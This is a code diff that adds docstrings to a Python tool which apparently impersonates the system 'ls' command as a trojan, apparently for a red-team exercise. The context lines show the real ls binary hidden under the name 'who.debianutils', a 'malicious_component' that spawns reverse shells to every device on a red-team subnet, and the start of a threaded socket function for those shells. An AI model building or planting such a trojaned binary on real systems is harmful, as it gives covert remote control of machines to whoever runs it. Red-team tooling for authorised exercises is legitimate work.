@@ -18,6 +18,12 @@ def main():
     malicious_component()
 
 def run_real_ls(arguments):
+    """Run the real LS command. The real command is hidden at who.debianutils
+
+    Args:
+        The arguments that are passed into the ls commands so they get passed through
+        to the real command
+    """
     # The real ls command will be hidden on the system. In this case, "who.debianutils"
     # Moving the real ls command will occur in ansible
     ls_command_with_args = ["who.debianutils", "--color=auto"]
@@ -26,6 +32,10 @@ def run_real_ls(arguments):
     ls_result = subprocess.call(ls_command_with_args)
 
 def malicious_component():
+    """The malicious component to this software. After running the real ls command, 
+        a reverse shell is spawned to connect to every device on the red team subnet
+
+    """
     # Initial specialized connection configuration
     # Basic logic of connecting a reverse shell to a single pre-defined IP address
     """
@@ -63,6 +73,12 @@ def malicious_component():
 
 
 def background_socket_connect(ip, port):
+    """function that serves creating reverse shell in a new socket in a separate thread
+
+    Args:
+        ip: The IP address to connect the reverse shell to
+        port: The port the reverse shell connects to
+    """
     try:
         s = socket.socket()
         s.settimeout(0.5)
